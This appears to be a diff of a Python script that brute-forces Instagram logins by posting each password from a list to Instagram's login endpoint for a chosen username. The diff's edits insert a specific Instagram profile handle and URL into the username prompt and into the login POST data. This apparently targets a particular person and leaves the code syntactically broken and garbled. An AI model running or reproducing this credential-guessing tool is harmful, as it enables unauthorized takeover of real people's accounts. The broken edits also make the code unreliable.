@@ -16,16 +16,16 @@ sess = requests.Session()
 
 UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'
 
-username = str(input('Please enter a username: '))
+username = str(input('Please enter a username:q.facu1889 '))
 
 delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
 
-
+https://www.instagram.com/q.facu1889?igsh=MWp4cnY4cjRoanVpMw==
 #check if passwords file con passwords
 if (len(passwords) < 1):
 	print ('Please add password to the passwords file')
 	exit()
-
+9
 #check if user exists
 r = sess.get('https://www.instagram.com/%s/?__a=1' % username) 
 if (r.status_code == 404):
@@ -55,7 +55,7 @@ headers = {
 for i in range(len(passwords)):
 	password = passwords[i]
 	#build post data
-	data = {'username':username, 'password':password}
+	data = {'username': https://www.instagram.com/q.facu1889?igsh=MWp4cnY4cjRoanVpMw== 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers)
 	#parse response
 	data = json.loads(r.text)
